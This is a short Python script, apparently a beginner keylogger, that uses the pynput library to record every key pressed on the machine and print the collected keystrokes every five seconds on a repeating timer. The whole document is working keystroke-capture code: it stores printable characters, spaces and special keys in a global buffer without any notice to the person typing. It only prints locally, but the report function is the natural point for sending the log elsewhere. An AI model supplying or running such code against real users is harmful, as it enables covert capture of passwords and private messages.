import pynput.keyboard
import threading

log = ''


def record(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    if log != "":
        print(log, end="")
    log = ""
    call_again = threading.Timer(5, report)
    call_again.start()


key_strike = pynput.keyboard.Listener(on_press=record)
with key_strike:
    report()
    key_strike.join()
